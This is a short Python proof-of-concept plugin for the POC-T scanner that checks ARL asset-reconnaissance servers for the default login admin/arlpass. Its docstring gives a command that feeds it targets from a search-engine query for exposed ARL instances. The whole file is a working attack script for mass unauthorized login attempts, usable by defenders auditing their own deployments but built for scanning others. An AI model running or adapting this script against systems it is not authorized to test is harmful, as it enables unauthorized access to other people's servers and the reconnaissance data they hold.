#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   ARL-weak-pass.py    
@Contact :   lihanwei@zhiqiansec.com
@DateTime :  2023/7/17 18:11 


    python POC-T.py -s ARL-weak-pass.py -aF 'product="资产灯塔系统"'


'''

import requests


def extract_info():
    pass


def poc(url):
    url = url.rstrip('/') + "/api/user/login"
    headers = {'Content-Type': 'application/json'}
    data = {"username": "admin", "password": "arlpass"}
    try:
        response = requests.post(url, headers=headers, json=data, timeout=5, verify=False)
        return "401" not in response.text

    except Exception as e:
        print("Exception: %s" % str(e))
        return False